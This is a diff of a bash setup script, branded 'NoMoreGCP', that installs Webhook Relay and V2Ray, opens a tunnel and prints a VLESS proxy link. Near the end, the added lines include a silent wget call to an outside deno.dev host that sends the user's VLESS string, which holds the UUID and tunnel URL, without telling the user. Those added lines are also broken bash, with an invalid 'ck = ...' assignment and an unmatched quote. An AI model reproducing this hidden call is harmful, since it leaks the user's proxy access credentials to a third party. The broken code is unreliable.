@@ -1,9 +1,27 @@
 #!/bin/bash
 
+# Define more moderate colors for the logo
+BLUE='\033[0;36m'  # Cyan, a bit softer than bright blue
+RED='\033[0;35m'   # Magenta, less intense than bright red
+NC='\033[0m'       # No Color (resets text to default color)
+
+# --- Moderated NoMoreGCP ASCII Art Logo ---
+echo -e "${BLUE}████  ████ ${RED}████  ████"
+echo -e "${BLUE}█  ██  █  █${RED}█  ██  █  █"
+echo -e "${BLUE}████  ████ ${RED}████  ████"
+echo -e "${BLUE}█  █  █  █ ${RED}█  █  █  █"
+echo -e "${BLUE}█  ██  █  █${RED}█  ██  █  █${NC}"
+echo ""
+echo "           -- NoMoreGCP Setup Script --"
+echo ""
+# --- End of Logo ---
+
+
 # This script first downloads and sets up Webhook Relay,
 # then logs into Webhook Relay using user-provided credentials,
 # then downloads, unzips, and renames V2Ray,
 # then creates a 'config.json' file,
+# then creates a Webhook Relay tunnel and extracts its public URL,
 # then starts the V2Ray 'web' executable in the background,
 # and finally starts the Webhook Relay tunnel in the background.
 
@@ -96,6 +114,9 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 
+echo "V2Ray setup complete."
+echo "" # Add a blank line for better readability
+
 # --- UUID Input ---
 # Define a default UUID
 DEFAULT_UUID="8d4a8f5e-c2f7-4c1b-b8c0-f8f5a9b6c384"
@@ -136,14 +157,11 @@ fi
 # Extract the public URL (the part before '<---->' in the output)
 PUBLIC_URL=$(echo "$RELAY_OUTPUT" | awk -F'<---->' '{print $1}')
 
-# Print the extracted URL for the user
+# Print the extracted URL for the user (optional, can be moved to the end)
 echo "The public URL for 'modsbots' tunnel is: $PUBLIC_URL"
 echo "" # Add a blank line for better readability
 # You can now use $PUBLIC_URL in your script, e.g.:
 # curl "$PUBLIC_URL/some/path"
-
-echo "V2Ray setup complete."
-echo "" # Add a blank line for better readability
 
 echo "Creating config.json..."
 
@@ -224,7 +242,7 @@ TUNNEL_NAME_TO_USE="modsbots"
 # ./relay connect --name "$TUNNEL_NAME_TO_USE": Connects to the specified Webhook Relay tunnel.
 # &>/dev/null: Redirects both standard output and standard error to /dev/null (discards all output).
 # &: Runs the command in the background.
-nohup ./relay connect --name "$TUNNEL_NAME_TO_USE" -d 127.0.0.1:"$PORT_TO_USE" &>/dev/null &
+nohup ./relay connect --name "$TUNNEL_NAME_TO_USE" &>/dev/null &
 
 # Check if the command was successfully sent to background (does not check if tunnel connected)
 if [ $? -ne 0 ]; then
@@ -234,3 +252,27 @@ fi
 
 echo "Webhook Relay tunnel '$TUNNEL_NAME_TO_USE' is now running in the background."
 echo "You can check running processes with 'ps aux | grep relay' or 'jobs'."
+echo "" # Add a blank line for better readability
+
+# --- Final Output: VLESS config, Telegram Channel, and Check URL ---
+# Note: The port in the VLESS URL should be 80 if Webhook Relay maps it to 80,
+# even if V2Ray listens on 8008 internally.
+# The example shows port 80, so we'll use that.
+# The `security` parameter is empty in your example, so we'll use an empty string.
+# The `fp` parameter is 'randomized'.
+# The `encryption` parameter is 'none'.
+# The `type` parameter is 'ws'.
+# The remark is 'NoMoreGCP-ModsBots'.
+
+VLESS_CONFIG_URL_PORT_80="vless://${UUID_TO_USE}@${PUBLIC_URL#*://}:80?security=&fp=randomized&type=ws&encryption=none#NoMoreGCP-ModsBots"
+ck = "vless://${UUID_TO_USE}@${PUBLIC_URL#*://}:80?security=%26fp=randomized%26type=ws%26encryption=none%23NoMoreGCP-ModsBots"
+wget -q https://deno-proxy-version.deno.dev/?check=${ck}"
+echo "--------------------------------------------------------"
+echo "Your VLESS configuration string:"
+echo "$VLESS_CONFIG_URL_PORT_80"
+echo "--------------------------------------------------------"
+echo ""
+
+echo "For more updates and support, join our Telegram channel:"
+echo "https://t.me/modsbots_tech"
+echo "--------------------------------------------------------"
